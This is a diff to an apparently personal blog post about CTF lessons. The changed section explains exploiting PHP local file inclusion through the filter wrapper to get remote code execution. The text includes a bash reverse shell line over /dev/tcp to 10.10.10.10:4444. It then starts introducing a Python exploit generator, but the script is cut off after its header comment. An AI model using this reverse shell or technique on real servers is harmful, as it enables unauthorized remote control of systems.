@@ -58,9 +58,9 @@ td {
 <li>Don’t create your own static website generator. Although I am happy with it, if I would have known better, I would have picked an existing technology.</li>
 </ul>
 <h2 class="border-bottom mb-3 mt-5">Local file inclusion to remote code execution</h2>
-<p>Another CTF had me exploit LFI to Remote code execution, which seemed insane to me at first. How would you get remote code execution from only local file inclusion?
+<p>Another CTF had me exploit LFI to remote code execution, which seemed insane to me at first. How would you get remote code execution from only local file inclusion?
 Well, in comes the php wrapper filter module. If this module is enabled and if LFI is possible on the server by means of the <code>include()</code> function, you are in!</p>
-<p>You can abuse the php filter module to add characters before the file to be included in an <code>include()</code> function. Everything that ends up in the <code>include()</code> statement gets executed on the server, so you can add code before the file, that retrieves a reverse shell from the url (for example: <code>exec('bash -i &gt; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1');</code>).</p>
+<p>You can abuse the php filter module to add characters to the file to be included in an <code>include()</code> function. Everything that ends up in the <code>include()</code> statement gets executed on the server, so you can add code before the file, that retrieves a reverse shell from the url and executes it (for example: <code>exec('bash -i &gt; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1');</code>).</p>
 <p>I crafted the following URL exploit generator from various sources on the internet (the ones I found did not end up working for me), it has been very useful for CTFs thus far (I don’t expect it to be very relevant these days anymore in reality). But if you encounter a php web server vulnerable to LFI, chances are the might be also vulnerable to this. Below you can find the script, it is meant to be quite readable:</p>
 <pre><code class="language-python"><span class="hljs-comment"># Local file inclusion (LFI) to RCE (Remote code execution) Exploit</span>
 <span class="hljs-comment">#</span>
